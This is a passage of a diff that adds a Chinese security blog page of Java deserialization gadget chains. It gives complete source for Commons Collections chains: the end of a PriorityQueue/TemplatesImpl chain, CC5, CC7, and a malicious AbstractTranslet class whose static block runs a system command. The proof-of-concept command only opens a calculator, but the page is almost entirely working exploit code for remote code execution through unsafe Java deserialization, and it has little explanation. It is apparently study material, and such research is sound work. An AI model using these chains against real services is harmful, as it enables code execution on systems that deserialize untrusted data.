+</span></span><span style="display:flex;"><span>        PriorityQueue priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(transformingComparator);
+</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(templates);
+</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> transformingComparator.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Field transformerField <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;transformer&#34;</span>);
+</span></span><span style="display:flex;"><span>        transformerField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        transformerField.<span style="color:#a6e22e">set</span>(transformingComparator,invokerTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(priorityQueue);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc5">CC5</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.management.BadAttributeValueExpException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC5</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>    Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    TiedMapEntry tiedMapEntry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    BadAttributeValueExpException badAttributeValueExpException <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BadAttributeValueExpException(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Class c <span style="color:#f92672">=</span> badAttributeValueExpException.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>    Field factoryField <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;val&#34;</span>);
+</span></span><span style="display:flex;"><span>    factoryField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    factoryField.<span style="color:#a6e22e">set</span>(badAttributeValueExpException,tiedMapEntry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>    ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>    ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>    oos.<span style="color:#a6e22e">writeObject</span>(badAttributeValueExpException);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>    ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>    ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>    ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc7">CC7</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Hashtable;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC7</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap map1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        HashMap map2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        map1.put(&#34;yy&#34;, 1);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        map2.put(&#34;zZ&#34;, 1);</span>
+</span></span><span style="display:flex;"><span>        map1.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;hack&#34;</span>, <span style="color:#f92672">-</span>50515712);
+</span></span><span style="display:flex;"><span>        map2.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;halfblue&#34;</span>, 4396);
+</span></span><span style="display:flex;"><span>        LazyMap lazyMap <span style="color:#f92672">=</span> (LazyMap) LazyMap.<span style="color:#a6e22e">decorate</span>(map2, <span style="color:#66d9ef">new</span> ConstantTransformer(1));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Hashtable hashtable <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable();
+</span></span><span style="display:flex;"><span>        hashtable.<span style="color:#a6e22e">put</span>(map1, 1);
+</span></span><span style="display:flex;"><span>        hashtable.<span style="color:#a6e22e">put</span>(lazyMap, 2);
+</span></span><span style="display:flex;"><span>        lazyMap.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;hack&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">class</span>;
+</span></span><span style="display:flex;"><span>        Field factoryField <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;factory&#34;</span>);
+</span></span><span style="display:flex;"><span>        factoryField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        factoryField.<span style="color:#a6e22e">set</span>(lazyMap,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(hashtable);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="test">TEST</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(e);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='tags'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z" />
+<line x1="7" y1="7" x2="7" y2="7" />
+</svg>
+<span class='screen-reader-text'>Tags: </span><a class='tag' href='/tags/javagadget/'>JavaGadget</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='next-entry sep-before'>
+      <a href='/docs/java/javabase/java%E5%9F%BA%E7%A1%80/'>
+        <span class='screen-reader-text'>Next post: </span>Java基础<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/N2ryx' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:neryx_02@163.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p></p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
